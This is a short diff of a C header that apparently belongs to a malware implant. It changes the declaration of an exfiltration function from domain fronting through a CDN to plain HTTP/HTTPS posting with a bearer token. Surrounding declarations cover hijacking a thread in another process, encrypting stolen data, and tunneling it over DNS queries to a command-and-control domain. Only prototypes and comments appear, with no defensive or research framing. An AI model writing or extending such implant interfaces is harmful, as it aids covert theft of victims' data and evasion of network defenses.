@@ -393,12 +393,10 @@ bool jocky_thread_hijack(uint32_t pid,
 bool jocky_exfil_encrypt(const uint8_t* data, size_t data_len,
                           uint8_t* out, size_t* out_len);
 
-/* Domain fronting — HTTPS POST to front_host (CDN SNI) with Host: real_host.
- * Certificate CN validation is relaxed; traffic still travels encrypted to
- * the CDN edge node before being forwarded to the real backend. */
-bool jocky_exfil_front(const char* front_host, const char* real_host,
-                        const char* path,
-                        const uint8_t* data, size_t data_len);
+/* HTTP/HTTPS exfil to endpoint with optional Bearer token auth.
+ * method is "POST" or "PUT"; chunk_size is reserved for future chunking. */
+bool jocky_exfil_front(const char* endpoint, const char* token,
+                        const char* data, const char* method, int32_t chunk_size);
 
 /* DNS tunneling — encode data as base32-labeled A-record queries against
  * c2_domain.  The authoritative resolver for that domain logs all queries.
